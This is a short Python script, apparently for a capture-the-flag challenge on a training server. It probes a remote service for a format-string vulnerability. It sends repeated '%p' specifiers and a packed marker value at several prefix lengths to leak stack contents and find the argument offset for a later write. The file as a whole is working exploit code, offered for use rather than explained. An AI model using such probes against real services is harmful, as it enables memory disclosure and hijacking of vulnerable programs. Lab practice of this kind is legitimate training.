import sys, re, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929

MARK = 0x4142434445464748  # marqueur 8 octets


def send(s, data):
    s.sendall(data + b"\n")


def collect(s, t=1.5):
    s.settimeout(0.5)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
        except socket.timeout:
            continue
    return buf


def run(a_bytes, b_bytes=b"2"):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(6)
    out = collect(s, 1.0)
    send(s, a_bytes)
    time.sleep(0.5)
    out2 = collect(s, 0.6)
    send(s, b_bytes)
    time.sleep(1.0)
    out3 = collect(s, 1.5)
    s.close()
    return (out + out2 + out3).decode("latin-1", "replace")


# "Calculating for A: " = 19 octets ; on aligne le marqueur sur un multiple de 8
# A commence a l'offset 19 du buffer ; le buffer commence a l'argument 10.
# offset 19 + len(prefixe) doit etre multiple de 8 -> prefixe de 13 octets => offset 32 => arg 14
for prefix_len in (5, 13, 21):
    pre = b"1" + b"A" * (prefix_len - 1)
    a = pre + b"%p." * 12 + struct.pack("<Q", MARK)
    out = run(a)
    m = re.search(r"Calculating for A: (.*?) and B:", out, re.S)
    print("prefix_len=%d ->" % prefix_len, (m.group(1)[:150] if m else out[:150]))
